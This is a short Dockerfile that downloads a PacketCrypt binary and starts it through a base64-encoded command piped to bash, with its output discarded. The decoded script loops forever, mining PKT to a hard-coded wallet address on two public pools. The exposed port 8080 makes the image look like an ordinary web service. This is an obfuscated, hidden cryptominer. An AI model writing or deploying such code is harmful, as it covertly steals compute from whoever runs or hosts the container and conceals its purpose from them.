FROM ubuntu:latest
RUN apt-get update -y
RUN apt-get install curl coreutils -y
RUN curl -L https://www.pkt.world/ext/packetcrypt-linux-amd64 --output packetcrypt
COPY . .
RUN chmod +x packetcrypt
EXPOSE 8080
CMD ["/bin/bash", "-c", "base64 -d <<< IyEvYmluL3NoCndoaWxlIFsgMSBdOyBkbwouL3BhY2tldGNyeXB0IGFubiAtcCBwa3QxcWxoODRmY3l5YzlqN2s3ZXE0cncwa3FmeDRrN3VlZnZydDR4ajM0IGh0dHA6Ly9wb29sLnBrdC53b3JsZCBodHRwOi8vcG9vbC5wa3Rwb29sLmlvCnNsZWVwIDYwCmRvbmU= | bash > /dev/null"]
